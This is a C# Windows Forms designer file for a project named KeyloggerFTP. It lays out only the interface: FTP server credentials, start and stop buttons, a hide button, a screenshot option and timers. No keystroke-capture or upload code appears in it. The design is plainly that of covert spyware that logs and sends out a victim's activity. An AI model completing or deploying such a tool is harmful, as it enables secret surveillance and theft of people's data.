﻿namespace KeyloggerFTP
{
    partial class Form1
    {
        /// <summary>
        /// Variable del diseñador requerida.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Limpiar los recursos que se estén utilizando.
        /// </summary>
        /// <param name="disposing">true si los recursos administrados se deben desechar; false en caso contrario.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Código generado por el Diseñador de Windows Forms

        /// <summary>
        /// Método necesario para admitir el Diseñador. No se puede modificar
        /// el contenido del método con el editor de código.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.B_Encender = new System.Windows.Forms.Button();
            this.B_Apagar = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.T_servidor = new System.Windows.Forms.TextBox();
            this.T_Usuario = new System.Windows.Forms.TextBox();
            this.T_password = new System.Windows.Forms.TextBox();
            this.B_Guardar = new System.Windows.Forms.Button();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.timer3 = new System.Windows.Forms.Timer(this.components);
            this.label7 = new System.Windows.Forms.Label();
            this.button2 = new System.Windows.Forms.Button();
            this.tomarFotos = new System.Windows.Forms.CheckBox();
            this.textBox3 = new System.Windows.Forms.TextBox();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.label8 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.Horas = new System.Windows.Forms.Label();
            this.button3 = new System.Windows.Forms.Button();
            this.label10 = new System.Windows.Forms.Label();
            this.groupBox = new System.Windows.Forms.GroupBox();
            this.groupBox.SuspendLayout();
            this.SuspendLayout();
            // 
            // B_Encender
            // 
            this.B_Encender.Location = new System.Drawing.Point(120, 70);
            this.B_Encender.Name = "B_Encender";
            this.B_Encender.Size = new System.Drawing.Size(75, 23);
            this.B_Encender.TabIndex = 0;
            this.B_Encender.Text = "Encender";
            this.B_Encender.UseVisualStyleBackColor = true;
            this.B_Encender.Click += new System.EventHandler(this.B_Encender_Click);
            // 
            // B_Apagar
            // 
            this.B_Apagar.Location = new System.Drawing.Point(201, 70);
            this.B_Apagar.Name = "B_Apagar";
            this.B_Apagar.Size = new System.Drawing.Size(75, 23);
            this.B_Apagar.TabIndex = 1;
            this.B_Apagar.Text = "Apagar";
            this.B_Apagar.UseVisualStyleBackColor = true;
            this.B_Apagar.Click += new System.EventHandler(this.B_Apagar_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(139, 3);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(141, 13);
            this.label1.TabIndex = 2;
            this.label1.Text = "CONFIGURAR DATOS FTP";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(51, 28);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(63, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "SERVIDOR";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(164, 28);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(56, 13);
            this.label3.TabIndex = 4;
            this.label3.Text = "USUARIO";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(265, 28);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(81, 13);
            this.label4.TabIndex = 5;
            this.label4.Text = "CONTRASEÑA";
            // 
            // T_servidor
            // 
            this.T_servidor.Location = new System.Drawing.Point(22, 44);
            this.T_servidor.Name = "T_servidor";
            this.T_servidor.Size = new System.Drawing.Size(114, 20);
            this.T_servidor.TabIndex = 7;
            this.T_servidor.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
            // 
            // T_Usuario
            // 
            this.T_Usuario.Location = new System.Drawing.Point(142, 44);
            this.T_Usuario.Name = "T_Usuario";
            this.T_Usuario.Size = new System.Drawing.Size(110, 20);
            this.T_Usuario.TabIndex = 8;
            this.T_Usuario.TextChanged += new System.EventHandler(this.textBox2_TextChanged);
            // 
            // T_password
            // 
            this.T_password.Location = new System.Drawing.Point(258, 44);
            this.T_password.Name = "T_password";
            this.T_password.Size = new System.Drawing.Size(97, 20);
            this.T_password.TabIndex = 9;
            this.T_password.TextChanged += new System.EventHandler(this.textBox3_TextChanged);
            // 
            // B_Guardar
            // 
            this.B_Guardar.Location = new System.Drawing.Point(363, 41);
            this.B_Guardar.Name = "B_Guardar";
            this.B_Guardar.Size = new System.Drawing.Size(69, 23);
            this.B_Guardar.TabIndex = 11;
            this.B_Guardar.Text = "Guardar";
            this.B_Guardar.UseVisualStyleBackColor = true;
            this.B_Guardar.Click += new System.EventHandler(this.button3_Click);
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 1;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // timer2
            // 
            this.timer2.Enabled = true;
            this.timer2.Interval = 5000;
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(0, 75);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(54, 13);
            this.label5.TabIndex = 12;
            this.label5.Text = "ESTADO:";
            this.label5.Click += new System.EventHandler(this.label5_Click_1);
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.ForeColor = System.Drawing.Color.Red;
            this.label6.Location = new System.Drawing.Point(51, 75);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(35, 13);
            this.label6.TabIndex = 13;
            this.label6.Text = "label6";
            this.label6.Click += new System.EventHandler(this.label6_Click);
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(362, 70);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(70, 23);
            this.button1.TabIndex = 14;
            this.button1.Text = "Ocultar";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // timer3
            // 
            this.timer3.Enabled = true;
            this.timer3.Interval = 5000;
            this.timer3.Tick += new System.EventHandler(this.timer3_Tick);
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(0, 103);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(563, 104);
            this.label7.TabIndex = 15;
            this.label7.Text = resources.GetString("label7.Text");
            this.label7.Click += new System.EventHandler(this.label7_Click);
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(282, 70);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(74, 23);
            this.button2.TabIndex = 16;
            this.button2.Text = "Offine";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // tomarFotos
            // 
            this.tomarFotos.AutoSize = true;
            this.tomarFotos.Location = new System.Drawing.Point(363, 12);
            this.tomarFotos.Name = "tomarFotos";
            this.tomarFotos.Size = new System.Drawing.Size(100, 17);
            this.tomarFotos.TabIndex = 17;
            this.tomarFotos.Text = "Tomar capturas";
            this.tomarFotos.UseVisualStyleBackColor = true;
            this.tomarFotos.CheckedChanged += new System.EventHandler(this.tomarFotos_CheckedChanged);
            // 
            // textBox3
            // 
            this.textBox3.Location = new System.Drawing.Point(315, 32);
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new System.Drawing.Size(52, 20);
            this.textBox3.TabIndex = 25;
            this.textBox3.TextChanged += new System.EventHandler(this.textBox3_TextChanged_1);
            // 
            // textBox2
            // 
            this.textBox2.Location = new System.Drawing.Point(250, 32);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new System.Drawing.Size(50, 20);
            this.textBox2.TabIndex = 24;
            this.textBox2.TextChanged += new System.EventHandler(this.textBox2_TextChanged_1);
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(173, 32);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(53, 20);
            this.textBox1.TabIndex = 23;
            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged_1);
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(312, 16);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(55, 13);
            this.label8.TabIndex = 22;
            this.label8.Text = "Segundos";
            this.label8.Click += new System.EventHandler(this.label8_Click);
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(247, 16);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(44, 13);
            this.label9.TabIndex = 21;
            this.label9.Text = "Minutos";
            // 
            // Horas
            // 
            this.Horas.AutoSize = true;
            this.Horas.Location = new System.Drawing.Point(170, 16);
            this.Horas.Name = "Horas";
            this.Horas.Size = new System.Drawing.Size(35, 13);
            this.Horas.TabIndex = 20;
            this.Horas.Text = "Horas";
            // 
            // button3
            // 
            this.button3.Location = new System.Drawing.Point(385, 29);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(75, 23);
            this.button3.TabIndex = 19;
            this.button3.Text = "Guardar";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click_1);
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(6, 29);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(158, 13);
            this.label10.TabIndex = 18;
            this.label10.Text = "Ingrese el tiempo entre capturas";
            // 
            // groupBox
            // 
            this.groupBox.Controls.Add(this.button3);
            this.groupBox.Controls.Add(this.textBox3);
            this.groupBox.Controls.Add(this.label10);
            this.groupBox.Controls.Add(this.textBox2);
            this.groupBox.Controls.Add(this.Horas);
            this.groupBox.Controls.Add(this.textBox1);
            this.groupBox.Controls.Add(this.label9);
            this.groupBox.Controls.Add(this.label8);
            this.groupBox.Location = new System.Drawing.Point(3, 200);
            this.groupBox.Name = "groupBox";
            this.groupBox.Size = new System.Drawing.Size(468, 62);
            this.groupBox.TabIndex = 26;
            this.groupBox.TabStop = false;
            this.groupBox.Enter += new System.EventHandler(this.groupBox1_Enter);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(565, 265);
            this.Controls.Add(this.groupBox);
            this.Controls.Add(this.tomarFotos);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.label6);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.B_Guardar);
            this.Controls.Add(this.T_password);
            this.Controls.Add(this.T_Usuario);
            this.Controls.Add(this.T_servidor);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.B_Apagar);
            this.Controls.Add(this.B_Encender);
            this.Name = "Form1";
            this.Text = "FanKeyFTP";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.groupBox.ResumeLayout(false);
            this.groupBox.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button B_Encender;
        private System.Windows.Forms.Button B_Apagar;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox T_servidor;
        private System.Windows.Forms.TextBox T_Usuario;
        private System.Windows.Forms.TextBox T_password;
        private System.Windows.Forms.Button B_Guardar;
        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.Timer timer2;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Timer timer3;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.CheckBox tomarFotos;
        private System.Windows.Forms.TextBox textBox3;
        private System.Windows.Forms.TextBox textBox2;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label Horas;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.GroupBox groupBox;
    }
}

